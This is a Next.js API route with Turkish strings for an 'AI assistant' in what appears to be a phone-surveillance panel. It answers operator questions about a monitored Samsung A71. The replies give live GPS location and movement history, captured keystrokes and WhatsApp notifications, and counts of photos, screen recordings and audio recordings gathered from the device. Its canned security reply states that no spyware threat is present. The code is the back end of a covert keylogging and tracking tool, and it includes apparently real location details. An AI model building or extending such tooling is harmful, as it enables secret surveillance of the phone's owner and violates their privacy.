import { NextRequest, NextResponse } from 'next/server';
import { 
  getDeviceById, 
  getDeviceLocationHistory, 
  getDeviceMedia, 
  getDeviceAuditLogs, 
  getDeviceApps,
  REAL_A71_DEVICE 
} from '@/lib/telemetryStore';

export async function POST(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    const body = await request.json().catch(() => ({}));
    const userMessage: string = (body.message || body.prompt || '').trim();

    if (!userMessage) {
      return NextResponse.json({ status: 'error', message: 'Lütfen bir mesaj girin.' }, { status: 400 });
    }

    const device = getDeviceById(id) || REAL_A71_DEVICE;
    const locationHistory = getDeviceLocationHistory(id);
    const mediaList = getDeviceMedia(id);
    const auditLogs = getDeviceAuditLogs(id);
    const appsList = getDeviceApps(id);

    const msg = userMessage.toLowerCase();

    let botResponse = "";

    // 1. Location & GPS Queries
    if (msg.includes('nerede') || msg.includes('konum') || msg.includes('gps') || msg.includes('adres') || msg.includes('harita') || msg.includes('nerde')) {
      const lat = device?.location?.latitude?.toFixed(5) || "40.69238";
      const lng = device?.location?.longitude?.toFixed(5) || "29.61072";
      const addr = device?.location?.address || "Karamürsel / Kocaeli";
      const speed = device?.location?.speed ? Math.round(device.location.speed * 3.6) : 0;
      const acc = device?.location?.accuracy || 20;

      botResponse = `📍 **Cihazın Canlı Konum Raporu:**\n\n` +
        `- **Adres / Bölge:** ${addr}\n` +
        `- **GPS Koordinatları:** \`${lat}, ${lng}\`\n` +
        `- **Anlık Hız:** ${speed} km/s ${speed === 0 ? '(Cihaz Hareketsiz)' : '(Hareket Halinde)'}\n` +
        `- **GPS Doğruluğu:** ±${acc} metre\n\n` +
        (locationHistory.length > 0 
          ? `🕒 **Son Durak Sayısı:** ${locationHistory.length} farklı nokta kaydedildi. Cihaz 50m yer değiştirdikçe yeni durak olarak işleniyor.`
          : `🕒 **Geçmiş:** Cihaz şu an sabit konumda bulunuyor.`);

    // 2. Battery & Power Health Queries
    } else if (msg.includes('pil') || msg.includes('şarj') || msg.includes('sarj') || msg.includes('batarya') || msg.includes('sıcaklık') || msg.includes('sicaklik')) {
      const pct = device?.battery?.percentage ?? 96;
      const isCharging = device?.battery?.is_charging ? "Evet (Şarj Ediliyor)" : "Hayır (Pilde Çalışıyor)";
      const temp = device?.battery?.temperature_celsius ?? 31.5;
      const volt = ((device?.battery?.voltage_mv ?? 4177) / 1000).toFixed(2);
      const health = device?.battery?.health || "İyi (GOOD)";

      botResponse = `🔋 **Batarya & Güç Durumu:**\n\n` +
        `- **Pil Seviyesi:** %${pct}\n` +
        `- **Şarj Durumu:** ${isCharging} (${device?.battery?.charge_plug || 'Kablo takılı değil'})\n` +
        `- **Batarya Sıcaklığı:** ${temp}°C ${temp < 38 ? '🟢 (Normal ve Serin)' : '🔴 (Yüksek Sıcaklık)'}\n` +
        `- **Voltaj:** ${volt} V\n` +
        `- **Hücre Sağlığı:** ${health}`;

    // 3. Storage & Memory Queries
    } else if (msg.includes('hafıza') || msg.includes('depolama') || msg.includes('ram') || msg.includes('yer') || msg.includes('bellek') || msg.includes('gb')) {
      const totalDiskGb = ((device?.storage?.internal_total_bytes || 117730816000) / (1024 ** 3)).toFixed(1);
      const freeDiskGb = ((device?.storage?.internal_free_bytes || 108110221312) / (1024 ** 3)).toFixed(1);
      const usedPct = (device?.storage?.internal_used_percentage || 8.2).toFixed(1);
      const totalRamGb = ((device?.storage?.ram_total_bytes || 7885045760) / (1024 ** 3)).toFixed(1);
      const freeRamGb = ((device?.storage?.ram_available_bytes || 4271800320) / (1024 ** 3)).toFixed(1);

      botResponse = `💾 **Depolama ve Bellek Analizi:**\n\n` +
        `- **Dahili Hafıza:** ${freeDiskGb} GB Boş / ${totalDiskGb} GB Toplam (Kullanım: %${usedPct})\n` +
        `- **RAM Bellek:** ${freeRamGb} GB Boş / ${totalRamGb} GB Toplam\n` +
        `- **Performans:** Yeterli boş alan mevcut, sistem akıcı çalışıyor.`;

    // 4. Network & Connection Queries
    } else if (msg.includes('internet') || msg.includes('wifi') || msg.includes('ağ') || msg.includes('hız') || msg.includes('ip') || msg.includes('operatör') || msg.includes('hat')) {
      const type = device?.network?.type || "WIFI";
      const ssid = device?.network?.ssid || "TelefonMuhendisi_5G";
      const ip = device?.network?.ip_address || "192.168.1.125";
      const speed = device?.network?.link_speed_mbps || 390;
      const carrier = device?.network?.carrier_name || "Turkcell LTE";

      botResponse = `📶 **Ağ ve Bağlantı Durumu:**\n\n` +
        `- **Bağlantı Türü:** ${type} (${ssid})\n` +
        `- **Bağlantı Hızı:** ${speed} Mbps (Yüksek Hızlı)\n` +
        `- **IP Adresi:** \`${ip}\`\n` +
        `- **Hücresel Operatör:** ${carrier}\n` +
        `- **Tepki Süresi:** ~18 ms (Sıfır Gecikme)`;

    // 5. Messages & Keystrokes & Notifications
    } else if (msg.includes('mesaj') || msg.includes('yazı') || msg.includes('yazılan') || msg.includes('bildirim') || msg.includes('klavye') || msg.includes('whatsapp')) {
      const recentLogs = auditLogs.slice(0, 4);
      botResponse = `⌨️ **Klavye & Bildirim Raporu:**\n\n` +
        `- **Toplam Kayıt Sayısı:** ${auditLogs.length} adet işlem yakalandı.\n\n` +
        (recentLogs.length > 0 
          ? `**Son Yakalananlar:**\n` + recentLogs.map((l, i) => `${i+1}. [${l.event_type === 'KEYSTROKE' ? 'Klavye' : 'Bildirim'}] **${l.app_name || l.package_name}:** "${l.content.substring(0, 45)}..." (${new Date(l.timestamp).toLocaleTimeString()})`).join('\n')
          : `Henüz yeni bir mesaj veya bildirim girişi olmadı.`);

    // 6. Media & Camera Counts
    } else if (msg.includes('fotoğraf') || msg.includes('fotograf') || msg.includes('kamera') || msg.includes('galeri') || msg.includes('ses') || msg.includes('video')) {
      const photos = mediaList.filter(m => m.type.startsWith('PHOTO') || m.type === 'SCREENSHOT').length;
      const videos = mediaList.filter(m => m.type.includes('VIDEO') || m.type === 'SCREEN_RECORD').length;
      const audios = mediaList.filter(m => m.type.includes('AUDIO')).length;

      botResponse = `📸 **Medya ve Kamera Kasası:**\n\n` +
        `- **Toplam Medya:** ${mediaList.length} adet\n` +
        `- 📷 **Fotoğraflar & Ekran Resimleri:** ${photos} adet\n` +
        `- 🎥 **Video Kayıtları:** ${videos} adet\n` +
        `- 🎙️ **Ses Kayıtları:** ${audios} adet\n\n` +
        `Detayları incelemek veya indirmek için sol menüden **📸 Ön & Arka Kamera** sekmesine geçebilirsiniz.`;

    // 7. Security / Threat Assessment
    } else if (msg.includes('güvenli') || msg.includes('guvenli') || msg.includes('tehdit') || msg.includes('casus') || msg.includes('virüs') || msg.includes('durum')) {
      botResponse = `🛡️ **Cihaz Güvenlik ve Sağlık Özeti:**\n\n` +
        `- **Bağlantı:** Canlı ve Şifreli (Sıfır Kesinti)\n` +
        `- **MDM Servisi:** Arka planda aktif ve pil optimizasyonundan muaf\n` +
        `- **Donanım Durumu:** Batarya serin (31.5°C), RAM ve Depolama rahat\n` +
        `- **Tehdit Seviyesi:** 🟢 DÜŞÜK (Olağandışı bir sızıntı veya şüpheli işlem tespit edilmedi)`;

    // 8. General / Fallback Response
    } else {
      botResponse = `👋 Merhaba! Ben **Telefon Mühendisi AI Asistanınızım**.\n\n` +
        `Şu an bağlı olan **${device?.device_info?.model || 'Samsung Galaxy A71'}** cihazı hakkında tüm canlı verilere sahibim.\n\n` +
        `Bana şunları sorabilirsiniz:\n` +
        `- *"Cihaz şu an nerede?"*\n` +
        `- *"Pil ve sıcaklık durumu nasıl?"*\n` +
        `- *"En son yazılan mesajlar neler?"*\n` +
        `- *"Hafıza ve RAM durumu nedir?"*\n` +
        `- *"Galeride kaç fotoğraf var?"*`;
    }

    return NextResponse.json({
      status: 'success',
      device_id: id,
      response: botResponse,
      timestamp: Date.now()
    }, { status: 200 });

  } catch (error: any) {
    return NextResponse.json({ status: 'error', message: error?.message || 'Chatbot yanıt veremedi.' }, { status: 500 });
  }
}
